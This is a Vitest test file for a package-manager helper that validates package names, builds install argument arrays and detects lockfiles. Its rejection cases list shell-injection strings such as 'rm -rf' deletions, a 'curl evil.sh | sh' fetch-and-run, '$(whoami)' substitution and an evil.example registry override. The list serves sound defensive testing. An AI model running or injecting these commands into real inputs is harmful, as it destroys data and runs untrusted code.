import fs from 'node:fs';
import os from 'node:os';
import path from 'node:path';
import { afterEach, beforeEach, describe, expect, it } from 'vitest';

import {
  detectPackageManager,
  getInstallArgs,
  installPackages,
  isValidPackageSpec,
  missingPackages,
  partitionPackageSpecs,
} from './package-manager';

describe('isValidPackageSpec', () => {
  it.each([
    'motion',
    'class-variance-authority',
    'tailwind-merge',
    '@scope/pkg',
    '@radix-ui/react-slot',
    'motion@12.0.0',
    'motion@^12',
    'motion@~12.1',
    'react@latest',
    'pkg@1.0.0-beta.1',
    'pkg@1.x',
  ])('accepts %s', (spec) => {
    expect(isValidPackageSpec(spec)).toBe(true);
  });

  it.each([
    '',
    'motion; rm -rf ~',
    'motion && curl evil.sh | sh',
    '$(whoami)',
    '`id`',
    'Motion',
    '../local-package',
    'file:../pkg',
    'git+https://github.com/x/y.git',
    'https://evil.example/pkg.tgz',
    '@scope',
    '@scope/',
    'pkg@>=1 <2',
    'pkg@1.0.0|calc',
    '-g',
    '--registry=https://evil.example',
    'a'.repeat(215),
  ])('rejects %p', (spec) => {
    expect(isValidPackageSpec(spec)).toBe(false);
  });

  it('partitions a list', () => {
    expect(partitionPackageSpecs(['motion', 'x; y', 'clsx'])).toEqual({
      valid: ['motion', 'clsx'],
      invalid: ['x; y'],
    });
  });
});

describe('getInstallArgs', () => {
  it('builds argument arrays, never a shell string', () => {
    expect(getInstallArgs('npm', ['motion', 'clsx'])).toEqual({
      command: 'npm',
      args: ['install', 'motion', 'clsx'],
    });
    expect(getInstallArgs('pnpm', ['motion'])).toEqual({
      command: 'pnpm',
      args: ['add', 'motion'],
    });
    expect(getInstallArgs('yarn', ['motion'])).toEqual({
      command: 'yarn',
      args: ['add', 'motion'],
    });
    expect(getInstallArgs('bun', ['motion'])).toEqual({ command: 'bun', args: ['add', 'motion'] });
  });

  it('refuses to run invalid names', () => {
    expect(() => installPackages(['motion', 'x; rm -rf /'])).toThrow(/invalid package names/);
  });
});

describe('project inspection', () => {
  let dir: string;

  beforeEach(() => {
    dir = fs.mkdtempSync(path.join(os.tmpdir(), 'nachui-pm-'));
  });

  afterEach(() => {
    fs.rmSync(dir, { recursive: true, force: true });
  });

  it('detects the package manager from the lockfile', () => {
    expect(detectPackageManager(dir)).toBe('npm');
    fs.writeFileSync(path.join(dir, 'bun.lock'), '');
    expect(detectPackageManager(dir)).toBe('bun');
    fs.writeFileSync(path.join(dir, 'pnpm-lock.yaml'), '');
    expect(detectPackageManager(dir)).toBe('pnpm');
  });

  it('lists packages missing from package.json, ignoring versions', () => {
    fs.writeFileSync(
      path.join(dir, 'package.json'),
      JSON.stringify({ dependencies: { react: '^19' }, devDependencies: { clsx: '^2' } }),
    );

    expect(missingPackages(['react', 'clsx', 'motion@^12', 'tailwind-merge'], dir)).toEqual([
      'motion@^12',
      'tailwind-merge',
    ]);
  });
});
